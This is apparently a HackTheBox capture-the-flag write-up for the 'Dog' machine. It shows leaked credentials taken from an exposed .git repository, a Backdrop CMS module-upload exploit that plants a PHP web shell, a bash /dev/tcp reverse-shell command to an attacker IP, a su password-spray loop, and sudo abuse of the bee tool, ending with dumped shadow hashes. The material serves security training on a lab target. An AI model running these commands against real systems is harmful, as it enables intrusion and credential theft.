---
render_with_liquid: false
title: HackTheBox Writeup - Dog
date: 2025-03-09 19:33:00 +1400
tags: [hackthebox, nmap, linux, feroxbuster, php, backdrop-cms, cms, git, git-dumper, discover-secrets, directory-listing, enum-version, user-enumeration, backdrop-cms2rce, webshell, password-spraying, sudo, backdrop-cms-bee, php-script]
image:
    path: https://labs.hackthebox.com/storage/avatars/426830ea2ae4f05f7892ad89195f8276.png
    width: 640
    height: 480
---



Dog is an easy-rated Linux machine that involves reading sensitive information through an exposed git repository and exposing credentials to get administrator access to `BackdropCMS`. The admin privileges allow an attacker to exploit Remote Code Execution by uploading a malicious archive containing a `PHP` backdoor to gain an initial foothold. The `johncusack` user account also reuses the `BackdropCMS` password. After compromising the `johncusack` account, the attacker finds that the user can run the `bee` executable with `sudo` privileges, which allows the attacker to gain root privileges.

# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/Dog]
└─$ pt init '10.129.220.250 dog.htb'
+---------+--------+----------------+---------+
| PROFILE | STATUS |       IP       | DOMAIN  |
+---------+--------+----------------+---------+
| dog     | on     | 10.129.220.250 | dog.htb |
+---------+--------+----------------+---------+
```

## Nmap

```bash

# Nmap 7.95 scan initiated Sun Mar  9 19:32:59 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, 10.129.220.250
Nmap scan report for 10.129.220.250
Host is up, received user-set (0.20s latency).
Scanned at 2025-03-09 19:33:00 CST for 18s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8=
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y=
|   256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
| http-git: 
|   10.129.220.250:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Home | Dog
| http-robots.txt: 22 disallowed entries 
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
| /user/password /user/login /user/logout /?q=admin /?q=comment/reply 
| /?q=filter/tips /?q=node/add /?q=search /?q=user/password 
|_/?q=user/register /?q=user/login /?q=user/logout
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sun Mar  9 19:33:18 2025 -- 1 IP address (1 host up) scanned in 18.62 seconds
```


## 80 - HTTP : Backdrop CMS


### Info

```ruby
http://10.129.220.250 [200] [Home | Dog] [Apache/2.4.41 (Ubuntu)] [22a3ac992e38ac50c4de145b584097fb88fe7f20] [Apache HTTP Server:2.4.41,Backdrop:1,PHP,Ubuntu]
```

![](/assets/obsidian/7ebd050fae934be6ec2148175428f430.png)

![](/assets/obsidian/4d67c4ab59e7122771c645f48c47bc87.png)


### Directory

```bash
[+] cat httpx/urls.txt | feroxbuster -k -A --stdin -w /usr/share/wordlists/dirb/common.txt --dont-scan .(tif|tiff|ico|cur|bmp|webp|svg|png|jpg|jpeg|jfif|gif|avif|apngogg|css|js|woff|woff2|eot|ttf|otf)$ -I css,png,jpg,gif --collect-words --collect-backups --collect-extensions --scan-dir-listings -C 404,400,500 -r -n --scan-limit 4 -o bulkdirb.txt
```

```bash
200      GET      115l      671w     5285c http://10.129.220.250/README.md
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        2w       23c http://10.129.220.250/.git/HEAD
200      GET      201l      761w    13386c http://10.129.220.250/
403      GET       40l       96w     2469c http://10.129.220.250/core/authorize.php
403      GET      113l      275w     7635c http://10.129.220.250/core/cron.php
403      GET       40l      211w     3457c http://10.129.220.250/core/update.php
200      GET       41l      142w     2984c http://10.129.220.250/core/install.php
200      GET       26l      167w     2915c http://10.129.220.250/core/
200      GET        4l       14w      112c http://10.129.220.250/files/README.md
200      GET       21l      114w     1957c http://10.129.220.250/files/
200      GET      201l      761w    13386c http://10.129.220.250/index.php
200      GET       35l      150w     1236c http://10.129.220.250/layouts/README.md
200      GET       16l       58w      941c http://10.129.220.250/layouts/
200      GET       15l       49w      745c http://10.129.220.250/modules/
200      GET       46l      155w     1198c http://10.129.220.250/robots.txt
200      GET        0l        0w        0c http://10.129.220.250/settings.php
200      GET        0l        0w        0c http://10.129.220.250/sites/sites.php
200      GET       75l      405w     3072c http://10.129.220.250/sites/README.md
200      GET       17l       69w     1136c http://10.129.220.250/sites/
200      GET       36l      174w     1380c http://10.129.220.250/themes/README.md
200      GET       16l       58w      939c http://10.129.220.250/themes/
[####################] - 68s    23923/23923   0s      found:21      errors:0
[####################] - 67s    23679/23679   354/s   http://10.129.220.250:80/ 
```

# User Flag
---

## Shell as www-data


### 80 - Backdrop CMS : .git directory exposure

Publicly accessible `.git` directory was revealed from nmap script and web directory enumeration scans, use [git-dumper](https://github.com/arthaud/git-dumper) to dump the repository

```bash
┌──(bravosec㉿fsociety)-[~/htb/Dog]
└─$ git-dumper http://10.129.220.250/ git-dumper
[-] Testing http://10.129.220.250/.git/HEAD [200]
[-] Testing http://10.129.220.250/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://10.129.220.250/.gitignore [404]
[-] http://10.129.220.250/.gitignore responded with status code 404
[-] Fetching http://10.129.220.250/.git/ [200]
[-] Fetching http://10.129.220.250/.git/HEAD [200]
[-] Fetching http://10.129.220.250/.git/branches/ [200]
[-] Fetching http://10.129.220.250/.git/config [200]
[...]
```

![](/assets/obsidian/3c1038b7ac183f079c0a87d60e775ec9.png)


### 80 - Backdrop CMS : Enumerate configs

> The repository wasn't cloned from a git repo, it was likely downloaded from official releases and initialized to a local git repository with only 1 commit

Check git config

```bash
┌──(bravosec㉿fsociety)-[~/htb/Dog/git-dumper]
└─$ cat .git/config
[core]
 repositoryformatversion = 0
 filemode = true
 bare = false
 logallrefupdates = true
```

Check git branches

```bash
┌──(bravosec㉿fsociety)-[~/htb/Dog/git-dumper]
└─$ git branch
* master
```

Check all commits from all branches

```bash
┌──(bravosec㉿fsociety)-[~/htb/Dog/git-dumper]
└─$ git log --reflog --all
commit 8204779c764abd4c9d8d95038b6d22b6a7515afa (HEAD -> master)
Author: root <dog@dog.htb>
Date:   Fri Feb 7 21:22:11 2025 +0000

    todo: customize url aliases.  reference:https://docs.backdropcms.org/documentation/url-aliases
```

By googling `backdrop cms docs`, we can get the config file location, which is `settings.php`

> https://docs.backdropcms.org/documentation/installation-instructions

![](/assets/obsidian/3c6e78198ec85a5ee21207b8fa1856da.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Dog/git-dumper]
└─$ vi settings.php
```

- Discovered the **mysql** database password : `BackDropJ2024DS2024` for user `root`

```php
/**
 * Database configuration:
 *
 * Most sites can configure their database by entering the connection string
 * below. If using primary/replica databases or multiple connections, see the
 * advanced database documentation at
 * https://api.backdropcms.org/database-configuration
 */
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';
[...]
```

- There are directories storing `json` config files that should be confidential but still accessible through directory listing once their names were exposed

```php
[...]
/**
 * Site configuration files location.
 *
 * By default these directories are stored within the files directory with a
 * hashed path. For the best security, these directories should be in a location
 * that is not publicly accessible through a web browser.
 *
 * Example using directories one parent level up:
 * @code
 * $config_directories['active'] = '../config/active';
 * $config_directories['staging'] = '../config/staging';
 * @endcode
 *
 * Example using absolute paths:
 * @code
 * $config_directories['active'] = '/home/myusername/config/active';
 * $config_directories['staging'] = '/home/myusername/config/staging';
 * @endcode
 */
$config_directories['active'] = './files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active';
$config_directories['staging'] = './files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/staging';
[...]
```

> http://10.129.220.250/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/

![](/assets/obsidian/13d87af3300069fdfea21c0673db95ad.png)

![](/assets/obsidian/898ace6d0711ee1c076af4e01146f96c.png)


### 80 - Backdrop CMS : Identify version

Search `version` in the commits from official repo to see which file stores the version info

> https://github.com/backdrop/backdrop/commits/1.x/

![](/assets/obsidian/a151e02537034bada2dc826cd6a2604b.png)

The version info stores in `core/includes/bootstrap.inc`

> https://github.com/backdrop/backdrop/commit/b734df449ce1c50c25bc6faf3511576112e5a204

![](/assets/obsidian/42c6a5936dd16f5b136ae03f8bb7efb4.png)

By checking the file from the dumped repository, we identified its version : `1.27.1`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Dog/git-dumper]
└─$ cat core/includes/bootstrap.inc | grep 'BACKDROP_VERSION'
define('BACKDROP_VERSION', '1.27.1');
```


### 80 - Backdrop CMS 1.27.1 : RCE (Authenticated)

- Google : `Backdrop CMS 1.27.1 exploit`

> POC - https://www.exploit-db.com/exploits/52021

> Authenticated users can install custom plugin through admin's dashboard to achieve command execution
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Dog]
└─$ cd exploit

┌──(bravosec㉿fsociety)-[~/htb/Dog/exploit]
└─$ searchsploit -m 52021
  Exploit: Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/52021
     Path: /usr/share/exploitdb/exploits/php/webapps/52021.py
    Codes: N/A
 Verified: True
File Type: Python script, Unicode text, UTF-8 text executable
Copied to: /home/kali/htb/Dog/exploit/52021.py
```

We've discovered a username `dogBackDropSystem` from the author name of a blog post, but failed to reuse the database root's password : `BackDropJ2024DS2024`

![](/assets/obsidian/ba4c1f93b949cf25d2bd741ae1a5a0d4.png)

> http://10.129.220.250/?q=user/login

![](/assets/obsidian/aa68b872d231a693c0908a8cb071a9cc.png)

By searching the email's domain name in the config files, we've discovered an email : `tiffany@dog.htb`

```bash
┌──(bravosec㉿fsociety)-[~/…/Dog/git-dumper/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3]
└─$ grep -rin dog.htb
active/update.settings.json:12:        "tiffany@dog.htb"
```

Password reuse of `BackDropJ2024DS2024` on `tiffany@dog.htb` was successful for **backdrop cms**

![](/assets/obsidian/d955188012281e0765c3b026a144e68b.png)

![](/assets/obsidian/f0c050c40cde80d1c4b7123b390a5bcc.png)

Run the exploit to create a malicious plugin that contains web shell

```bash
┌──(bravosec㉿fsociety)-[~/htb/Dog/exploit]
└─$ python 52021.py http://dog.htb
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://dog.htb/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://dog.htb/modules/shell/shell.php
```

While uploading the plugin, it shows that only following extensions are allowed: `tar tgz gz bz2`

> http://10.129.220.250/?q=admin/installer/manual

![](/assets/obsidian/1cba7cd27c81ece5329c8b444bed26c1.png)

![](/assets/obsidian/80e4a887cbc633aa86e5ff67e1366680.png)

Pack the plugin folder as `.tar` archive then re-upload it

```bash
┌──(bravosec㉿fsociety)-[~/htb/Dog/exploit]
└─$ tar cf shell.tar shell
```

![](/assets/obsidian/a5ec655036a836c3d3ce1d309328f301.png)

Command execution was successful

```bash
┌──(bravosec㉿fsociety)-[~/htb/Dog/exploit]
└─$ curl 'http://dog.htb/modules/shell/shell.php?cmd=id'

    <html>
    <body>
    <form method="GET" name="shell.php">
    <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
    <input type="SUBMIT" value="Execute">
    </form>
    <pre>
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    </pre>
    </body>
    </html>
```

Start reverse shell listener

```bash
nc -lvnp 53
```

Get a shell

```bash
┌──(bravosec㉿fsociety)-[~/htb/Dog/exploit]
└─$ PAYLOAD="$(printf %s '/bin/bash -c "bash -i >& /dev/tcp/10.10.14.60/53 0>&1"'|jq -sRr @uri)"; curl "http://dog.htb/modules/shell/shell.php?cmd=${PAYLOAD}"
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Dog/exploit]
└─$ nc -lvnp 53
listening on [any] 53 ...
connect to [10.10.14.60] from (UNKNOWN) [10.129.220.250] 35360
bash: cannot set terminal process group (1010): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dog:/var/www/html/modules/shell$ /usr/bin/script -qc /bin/bash /dev/null
<ules/shell$ /usr/bin/script -qc /bin/bash /dev/null
www-data@dog:/var/www/html/modules/shell$ ^Z
zsh: suspended  nc -lvnp 53

┌──(bravosec㉿fsociety)-[~/htb/Dog/exploit]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 53
                             export TERM=xterm
www-data@dog:/var/www/html/modules/shell$ stty rows 50 columns 209
www-data@dog:/var/www/html/modules/shell$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


## From www-data to johncusack


### Password spray

```bash
www-data@dog:/var/www/html/modules/shell$ PASS='BackDropJ2024DS2024'; for USER in $(cat /etc/passwd|grep -viE 'false$|nologin$|sync$'|awk -F: '{print $1}'); do (x=$(echo $PASS | su "$USER" -c whoami); if [ "$x" ]; then echo "[+] $USER"; fi) & done
[1] 41806
[2] 41807
[3] 41809
www-data@dog:/var/www/html/modules/shell$ Password: Password: Password: shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
[+] johncusack
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Dog]
└─$ sshpass -p 'BackDropJ2024DS2024' ssh -o "StrictHostKeyChecking no" johncusack@10.129.220.250
Warning: Permanently added '10.129.220.250' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun 09 Mar 2025 06:42:46 PM UTC

  System load:           0.08
  Usage of /:            59.2% of 6.32GB
  Memory usage:          25%
  Swap usage:            0%
  Processes:             230
  Users logged in:       1
  IPv4 address for eth0: 10.129.220.250
  IPv6 address for eth0: dead:beef::250:56ff:feb0:d232


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Tue Mar 4 17:04:29 2025 from 10.10.14.60
johncusack@dog:~$ id
uid=1001(johncusack) gid=1001(johncusack) groups=1001(johncusack)
johncusack@dog:~$ cat user.txt
a9dd5c302a44a0c51da2f52ea515b087
```


# Root Flag
---

## From johncusack to root


### SUDO - Bee (Backdrop CMS CLI tool)

```bash
johncusack@dog:~$ sudo -l
[sudo] password for johncusack:
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

```bash
johncusack@dog:~$ ls -la /usr/local/bin/bee
lrwxrwxrwx 1 root root 26 Jul  9  2024 /usr/local/bin/bee -> /backdrop_tool/bee/bee.php
johncusack@dog:~$ ls -la /backdrop_tool/bee/bee.php
-rwxr-xr-x 1 root root 2905 Jul  9  2024 /backdrop_tool/bee/bee.php
```

The php script is a CLI tool made by **Backdrop CMS** team

```bash
johncusack@dog:~$ head /backdrop_tool/bee/bee.php

#!/usr/bin/env php
<?php
/**
 * @file
 * A command line utility for Backdrop CMS.
 */

// Exit gracefully with a meaningful message if installed within a web
// accessible location and accessed in the browser.
if (!bee_is_cli()) {
```

> Repo - https://github.com/backdrop-contrib/bee

![](/assets/obsidian/5733d4b338f4d7fb2bddd0066838c5c3.png)

Check command usage

```bash
johncusack@dog:~$ bee
🐝 Bee
Usage: bee [global-options] <command> [options] [arguments]

Global Options:
 --root
 Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current directory.

 --site
 Specify the directory name or URL of the Backdrop site to use (as defined in 'sites.php'). If not set, will try to find the Backdrop site automatically based on the current directory.

 --base-url
 Specify the base URL of the Backdrop site, such as https://example.com. May be useful with commands that output URLs to pages on the site.

 --yes, -y
 Answer 'yes' to questions without prompting.

 --debug, -d
 Enables 'debug' mode, in which 'debug' and 'log' type messages will be displayed (in addition to all other messages).


Commands:
 CONFIGURATION
  config-export
   cex, bcex
   Export config from the site.
[...]
```

There are some interesting commands in the `advanced` category

![](/assets/obsidian/f91630b43f9097deb08fc7d5a44c9962.png)

While running the `eval` command, we got an error indicating that **backdrop CMS** isn't running

```bash
johncusack@dog:~$ bee eval 'system("id");'

 ✘  The required bootstrap level for 'eval' is not ready.
```

By checking the status of **backdrop CMS**, it shows that we need to specify `Backdrop installation` directory

```bash
johncusack@dog:~$ bee status

 ⚠️ No Backdrop installation found. Run this command again from within a Backdrop installation, or use the '--root' global option.
```

After specifying the root directory, it still shows the same error

```bash
johncusack@dog:~$ bee --root='/var/www/html' status

 ⚠️ No Backdrop installation found. Run this command again from within a Backdrop installation, or use the '--root' global option.
```

But it was successful from `www-data`'s shell

```bash
www-data@dog:/$ bee --root='/var/www/html' status

 Backdrop CMS             1.27.1
 Bee version              1.x-1.x
 Bee root directory       /backdrop_tool/bee
 Site root directory      /var/www/html
 Site type                Single
 Database                 mysql
 Database name            backdrop
 Database username        root
 Database password        **********
 Database host            127.0.0.1
 Database port
 Cron last run            2025-03-09 15:07:39 GMT+0000
 Install time             2024-07-09 18:12:15 GMT+0000
 Update last check        2025-02-07 21:12:04 GMT+0000
 Settings.php path        /var/www/html/settings.php
 Drupal compatibility     on
 Config storage active    /var/www/html/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active
 Config storage staging   /var/www/html/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/staging
 Site name                Dog
 Default theme            basis
 Admin theme              seven
 Public files path        /var/www/html/files
 Temporary files path     /tmp
 Preprocess CSS           on
 Preprocess JS            on
 Theme debug              off
 Error display level      hide
 PHP cli version          7.4.3-4ubuntu2.28
 PHP ini path             /etc/php/7.4/cli/php.ini
```

That's because `johncusack` don't have permissions to access `/var/www/html`

```bash
johncusack@dog:/var/www/html$ ls -latr
total 96
-rwxrwx--- 1 www-data www-data  1198 Mar  7  2024 robots.txt
-rwxrwx--- 1 www-data www-data  5285 Mar  7  2024 README.md
-rwxrwx--- 1 www-data www-data 18092 Mar  7  2024 LICENSE.txt
-rwxrwx--- 1 www-data www-data   578 Mar  7  2024 index.php
drwxr-xr-x 3 root     root      4096 Jul  8  2024 ..
drwxrwx--- 2 www-data www-data  4096 Jul  8  2024 sites
drwxrwx--- 2 www-data www-data  4096 Jul  8  2024 layouts
drwxrwx--- 2 www-data www-data  4096 Jul  8  2024 themes
drwxrwx--- 9 www-data www-data  4096 Jul  8  2024 core
-rwxrwx--- 1 www-data www-data 21732 Jul  8  2024 settings.php
drwxrwx--- 7 www-data www-data  4096 Jul  9  2024 files
drwxrwxr-x 9 www-data www-data  4096 Feb  7 21:21 .
drwxr-xr-x 8 root     root      4096 Feb  7 21:22 .git
drwxrwx--- 2 www-data www-data  4096 Mar  9 17:18 modules
```

Give everyone `rw` (`read` and `write`) permissions for all files under `/var/www/html` from `www-data`'s shell

```bash
www-data@dog:/$ chmod -R 755 /var/www/html/
chmod: changing permissions of '/var/www/html/.git': Operation not permitted
[...]
```

We are able to run the `eval` command as root from `johncusack`'s shell now

```bash
johncusack@dog:~$ sudo bee --root='/var/www/html' eval 'system("id");'
uid=0(root) gid=0(root) groups=0(root)
```

Get a shell as `root`

```bash
johncusack@dog:~$ sudo bee --root='/var/www/html' eval 'system("bash");'
root@dog:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
root@dog:/var/www/html# cat /root/root.txt
a27d0774c3bd67b35902fa58aef9b53f
```

# Additional
---

## Post exploitation


### Secrets

```bash
root@dog:/var/www/html# awk -F: '$2 ~ /^\$/' /etc/shadow
root:$6$buHS/pADc6PYMPvf$XTArYbNF62hfC04MHiAhaXHeWdUblAeXNLc/SbN7baQRUfHgIhmklPJfj2u7HZp9qb6gpFyXVnicT4FvRJ4Nm/:20117:0:99999:7:::
jobert:$6$9NZzmqUK4cJcMtd/$.CO/yezHu0S6cUZdPcd2QHfg3YVM7VUCMlHUvTCF.J7dMFB8sdNerBjIwe.l5YHZcXn2c0lkux5jI8eaC0B/x/:19950:0:99999:7:::
johncusack:$6$70rLgjVTNIxmr6zb$N2vsXuYZ7rug6ksshK5Jdwp0mUrQ.KvH3t73ycJe87QxNFw96GV.V/GEYWtzM/Cc..ISjhaleee5/uP29XZzM.:19950:0:99999:7:::
```